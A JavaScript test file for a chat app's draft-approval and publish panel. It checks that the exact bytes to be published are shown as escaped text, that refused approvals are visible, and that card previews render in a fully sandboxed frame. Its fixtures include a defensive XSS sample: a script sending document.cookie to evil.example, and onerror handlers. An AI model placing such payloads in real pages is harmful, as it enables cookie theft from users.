// The in-chat "Approve and publish" card, locked as a regression test.
//
// This panel is the gate every chat-initiated Guru push passes through, so two
// things must be true of it no matter what Python concluded:
//
//   1. the exact bytes that will be sent are ALWAYS reachable — a collapsed
//      disclosure that is present for every draft shape, never one that appears
//      only when a warning fires (every detector that has gated this view was
//      later defeated by whoever wrote the payload);
//   2. those bytes render as ESCAPED TEXT — never markup, never a live frame.
//      The content is assumed hostile; that is the whole point of showing it.
//   3. a REFUSED approval says so on this surface. The approval is bound to
//      the bytes the panel rendered (agent_chat's approval fingerprint), and a
//      draft the `revise_draft` chat tool mutated afterwards refuses and
//      publishes nothing. A bare failure is indistinguishable from a Guru
//      outage, and the natural response to an outage is to click again.
import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { Bubble, Composer, DraftCard, ResolveNotice, ReviewPanel, unbadgeDispatched } from "./ChatApp.jsx";
import { GuruCardPreview, PreviewCardButton, guruCardDoc } from "./GuruCardPreview.jsx";

const noop = () => {};

const HOSTILE = '<h1>Refund policy</h1>'
  + '<script>steal("https://evil.example/x?c=" + document.cookie)</script>'
  + '<img src="/logo.png" onerror="go(\'//evil.example/steal\')">';

function card(extra) {
  return {
    draft_id: 1, title: "Refund policy", change_count: 2,
    diff: [{ tag: "add", text: "Refund policy" }], checks: [],
    notice: "", publish_body: "", publish_body_available: true, ...extra,
  };
}

function render(extra) {
  return renderToStaticMarkup(
    <DraftCard d={card(extra)} onApprove={noop} onReject={noop} busy={false} />);
}

describe("DraftCard — the exact-bytes disclosure", () => {
  it("is present with NO notice (access does not depend on a detector)", () => {
    const out = render({ notice: "", publish_body: "<p>hello</p>" });
    expect(out).toContain("<details");
    expect(out).toContain("Exact bytes that will be sent");
    expect(out).toContain("&lt;p&gt;hello&lt;/p&gt;");
  });

  it("is present with a notice too, and flags it on the summary", () => {
    const out = render({ notice: "NOT SHOWN ABOVE but WILL be sent",
                         publish_body: HOSTILE });
    expect(out).toContain("Exact bytes that will be sent");
    expect(out).toContain("does not account for them");
    expect(out).toContain("NOT SHOWN ABOVE but WILL be sent");
  });

  it("is CLOSED by default (one header row, the diff keeps the space)", () => {
    const out = render({ publish_body: HOSTILE });
    expect(out).not.toContain("<details open");
    expect(out).not.toMatch(/<details[^>]*open=""/);
    expect(out).toContain("<summary");
  });

  it("renders hostile bytes as ESCAPED TEXT, never as markup", () => {
    const out = render({ publish_body: HOSTILE });
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("evil.example");
    expect(out).toContain("document.cookie");
    expect(out).toContain("onerror");
    // nothing live: no executable tag, no frame, no injection sink
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain("<img src=\"/logo.png\"");
    expect(out).not.toContain("<iframe");
  });

  it("shows a size hint so an empty or truncated body is obvious", () => {
    expect(render({ publish_body: "abcde" })).toContain("5 chars");
    expect(render({ publish_body: "" })).toContain("0 chars");
  });

  it("says the body is unavailable rather than looking like empty bytes", () => {
    const out = render({ publish_body: "", publish_body_available: false });
    expect(out).toContain("unavailable");
    expect(out).toContain("do not approve it");
  });

  it("tolerates a payload with no publish_body key at all", () => {
    const out = renderToStaticMarkup(
      <DraftCard d={{ draft_id: 7, title: "T", change_count: 0, diff: [] }}
                 onApprove={noop} onReject={noop} busy={false} />);
    expect(out).toContain("Exact bytes that will be sent");
  });

  it("still renders the notice as escaped text", () => {
    const out = render({ notice: '<img src=x onerror=alert(1)>' });
    expect(out).toContain("&lt;img");
    expect(out).not.toContain("<img src=x");
  });
});

describe("Composer — stop the run + add context while busy", () => {
  function composer(props) {
    return renderToStaticMarkup(
      <Composer input="more context" onInput={noop} onSend={noop} onStop={noop}
                busy={false} stopping={false} disabled={false} mic={null}
                {...props} />);
  }

  it("keeps the input ENABLED while a turn runs (extra context queues)", () => {
    expect(composer({ busy: true })).not.toMatch(/<input[^>]*disabled/);
    expect(composer({ busy: false })).not.toMatch(/<input[^>]*disabled/);
  });

  it("swaps Send for Stop while busy", () => {
    const busyOut = composer({ busy: true });
    expect(busyOut).toContain(">Stop</button>");
    expect(busyOut).not.toContain(">Send</button>");
    const idleOut = composer({ busy: false });
    expect(idleOut).toContain(">Send</button>");
    expect(idleOut).not.toContain(">Stop</button>");
  });

  it("disables Stop after the click until busy clears", () => {
    const out = composer({ busy: true, stopping: true });
    expect(out).toMatch(/<button[^>]*class="send stop"[^>]*disabled/);
  });

  it("leaves Stop clickable before the click", () => {
    const out = composer({ busy: true, stopping: false });
    expect(out).not.toMatch(/<button[^>]*class="send stop"[^>]*disabled/);
  });
});

describe("Bubble — the queued badge", () => {
  it("badges a message parked while a turn runs", () => {
    const out = renderToStaticMarkup(
      <Bubble m={{ role: "user", text: "later please", queued: true }} />);
    expect(out).toContain("queued-badge");
    expect(out).toContain("later please");
  });

  it("has no badge once the message is no longer queued", () => {
    const out = renderToStaticMarkup(
      <Bubble m={{ role: "user", text: "later please" }} />);
    expect(out).not.toContain("queued-badge");
  });

  it("renders the stopped-run system line", () => {
    const out = renderToStaticMarkup(
      <Bubble m={{ role: "system", text: "Run stopped." }} />);
    expect(out).toContain("msg system");
    expect(out).toContain("Run stopped.");
  });
});

describe("unbadgeDispatched — the badge clears on the named text only", () => {
  // The bridge's queuedDispatched(text) names EXACTLY what Python drained.
  // Un-badging must match on that text — never "the oldest queued bubble on
  // busyChanged(true)", because the Python queue interleaves items with no
  // bubble here ([SYSTEM] picker triggers, sends from the other surface).
  const msgs = [
    { role: "user", text: "first", queued: true },
    { role: "user", text: "second", queued: true },
    { role: "user", text: "not queued twin" },
  ];

  it("clears the first queued bubble whose text matches", () => {
    const out = unbadgeDispatched(msgs, "second");
    expect(out[0].queued).toBe(true);   // untouched — a different text
    expect(out[1].queued).toBe(false);  // the named one
  });

  it("does not clear anything when the dispatched item has no bubble here", () => {
    // A [SYSTEM] trigger or an other-surface send drained: this surface's
    // queued bubbles keep their badges.
    const out = unbadgeDispatched(msgs, "[SYSTEM: operator selected a board]");
    expect(out).toBe(msgs);             // same array — no state churn either
    expect(out[0].queued).toBe(true);
    expect(out[1].queued).toBe(true);
  });

  it("clears only ONE bubble when duplicates are queued", () => {
    const dupes = [
      { role: "user", text: "again", queued: true },
      { role: "user", text: "again", queued: true },
    ];
    const out = unbadgeDispatched(dupes, "again");
    expect(out[0].queued).toBe(false);
    expect(out[1].queued).toBe(true);
  });

  it("ignores a non-queued bubble with the same text", () => {
    const out = unbadgeDispatched(msgs, "not queued twin");
    expect(out).toBe(msgs);
  });

  it("does not mutate the input array", () => {
    const before = msgs.map((m) => ({ ...m }));
    unbadgeDispatched(msgs, "first");
    expect(msgs).toEqual(before);
  });
});

const STALE = "This draft changed after you reviewed it — nothing was "
  + "published. Re-open the review panel and read the new content before approving.";

describe("ReviewPanel — a refused approval is visible", () => {
  function panel(note) {
    return renderToStaticMarkup(
      <ReviewPanel drafts={[]} open onClose={noop} onApprove={noop}
                   onReject={noop} busyId={null} note={note}
                   onDismissNote={noop} />);
  }

  it("shows the refusal Python sent, verbatim", () => {
    const out = panel({ message: STALE, refused: true });
    expect(out).toContain("changed after you reviewed it");
    expect(out).toContain("nothing was published");
    expect(out).toContain('role="alert"');
  });

  it("shows nothing when there is nothing to say", () => {
    expect(panel(null)).not.toContain("dresolve");
    expect(panel({})).not.toContain("dresolve");
  });

  it("does not invent its own reason for a failure", () => {
    // no message => no banner. The page never reconstructs why a publish did
    // not happen; only Python knows, and only Python says.
    expect(panel({ refused: true })).not.toContain("dresolve");
  });

  it("renders the message as escaped text", () => {
    const out = renderToStaticMarkup(
      <ResolveNotice note={{ message: '<img src=x onerror=alert(1)>' }}
                     onDismiss={noop} />);
    expect(out).toContain("&lt;img");
    expect(out).not.toContain("<img src=x");
  });
});

describe("DraftCard — Edit in Workbench + Send to Guru as draft (WS-B/C1)", () => {
  it("renders both buttons only when handlers are wired", () => {
    const bare = render({});
    expect(bare).not.toContain("Edit in Workbench");
    expect(bare).not.toContain("Send to Guru as draft");
    const wired = renderToStaticMarkup(
      <DraftCard d={card({})} onApprove={noop} onReject={noop} busy={false}
                 onSendToGuruDraft={noop} onEditInWorkbench={noop} />);
    expect(wired).toContain("Edit in Workbench");
    expect(wired).toContain("Send to Guru as draft");
  });

  it("gates the draft push like Approve, but never the edit button", () => {
    const moved = renderToStaticMarkup(
      <DraftCard d={card({ review_state: "changed" })} onApprove={noop}
                 onReject={noop} busy={false}
                 onSendToGuruDraft={noop} onEditInWorkbench={noop} />);
    // stale review: draft push disabled, edit (navigation-only) still live
    expect(moved).toMatch(/dguru-draft[^>]*disabled/);
    expect(moved).not.toMatch(/dedit[^>]*disabled/);
  });
});

// ── Guru-card mirror preview (WS-D-WEB M4) ─────────────────────────────
// The popup frames ONLY d.preview_srcdoc (Python-sanitized, PREVIEW profile);
// d.publish_body stays escaped-text-only. attr helper mirrors task.test.jsx.

function unescapeAttr(s) {
  return s.replace(/&quot;/g, '"').replace(/&#x27;/g, "'")
    .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
}

const PREVIEW_HTML = '<h1>Refund policy</h1>'
  + '<section class="ghq-card-content__callout"'
  + ' data-ghq-card-content-type="CALLOUT"'
  + ' style="background-color:#00bcd62b">note</section>';

function previewCard(extra) {
  return card({ preview_srcdoc: PREVIEW_HTML, preview_notes: [],
                publish_body: HOSTILE, ...extra });
}

function renderPreview(extra) {
  return renderToStaticMarkup(
    <GuruCardPreview d={previewCard(extra)} onClose={noop} />);
}

describe("GuruCardPreview — the Guru-look popup", () => {
  it("renders a fully sandboxed frame — no scripts, ever", () => {
    const out = renderPreview();
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("allow-scripts");
  });

  it("frames ONLY the Python-sanitized preview, never publish_body", () => {
    const out = renderPreview();
    const m = out.match(/srcdoc="([^"]*)"/i);
    expect(m).toBeTruthy();
    const doc = unescapeAttr(m[1]);
    expect(doc).toContain("ghq-card-content__callout");   // preview content
    expect(doc).not.toContain("evil.example");            // publish_body content
    expect(doc).not.toContain("document.cookie");
  });

  it("ships the Guru block styling inside the frame document", () => {
    const doc = guruCardDoc("<p>x</p>");
    expect(doc).toContain(".ghq-card-content__collapsible");
    expect(doc).toContain(".ghq-card-content__guru-card");
    expect(doc).toContain("<p>x</p>");
  });

  it("shows the unverified state — a pending draft is never Verified", () => {
    const out = renderPreview();
    expect(out).toContain("Needs verification");
  });

  it("no preview bytes → no frame, and points at the bytes panel", () => {
    const out = renderPreview({ preview_srcdoc: "" });
    expect(out).not.toContain("<iframe");
    expect(out).toContain("No preview is available");
  });

  it("divergence notes surface as a warning with the count", () => {
    const out = renderPreview(
      { preview_notes: ["REMOVED: script", "REMOVED: handler"] });
    expect(out).toContain("differs from the exact bytes in 2 ways");
    expect(out).toContain("gpv-note warn");
  });

  it("a faithful preview says so without crying wolf", () => {
    const out = renderPreview({ preview_notes: [] });
    expect(out).toContain("same bytes you approve");
    expect(out).not.toContain("gpv-note warn");
  });
});

describe("DraftCard — preview entry point", () => {
  it("offers the button and the closed card stays frame-free", () => {
    const out = render({ preview_srcdoc: PREVIEW_HTML, publish_body: HOSTILE });
    expect(out).toContain("Preview card");
    expect(out).not.toContain("<iframe");   // popup opens only on click
  });

  it("disables the button when no preview is available", () => {
    const out = render({ preview_srcdoc: "" });
    expect(out).toMatch(/dpreview[^>]*disabled/);
  });

  it("PreviewCardButton alone never renders a frame while closed", () => {
    const out = renderToStaticMarkup(
      <PreviewCardButton d={previewCard({})} />);
    expect(out).toContain("dpreview");
    expect(out).not.toContain("<iframe");
  });
});
